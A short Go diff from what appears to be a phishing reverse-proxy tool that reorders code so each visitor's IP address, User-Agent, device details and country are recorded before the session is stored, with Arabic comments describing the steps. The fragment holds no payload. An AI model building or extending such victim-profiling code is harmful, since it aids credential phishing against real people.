@@ -588,6 +588,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
+									
+									session.RemoteAddr = remote_addr
+									session.UserAgent = req.Header.Get("User-Agent")
+									// استخراج معلومات الجهاز والمتصفح من User-Agent
+									session.ParseUserAgent()
+									// محاولة استخراج معلومات البلد من عنوان IP
+									session.ExtractCountryFromIP()
+									
 									if err := p.db.CreateSession(
 										session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr,
 										session.CountryCode, session.CountryName,
@@ -597,12 +605,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 
-									session.RemoteAddr = remote_addr
-									session.UserAgent = req.Header.Get("User-Agent")
-									// استخراج معلومات الجهاز والمتصفح من User-Agent
-									session.ParseUserAgent()
-									// محاولة استخراج معلومات البلد من عنوان IP
-									session.ExtractCountryFromIP()
 									session.RedirectURL = pl.RedirectUrl
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
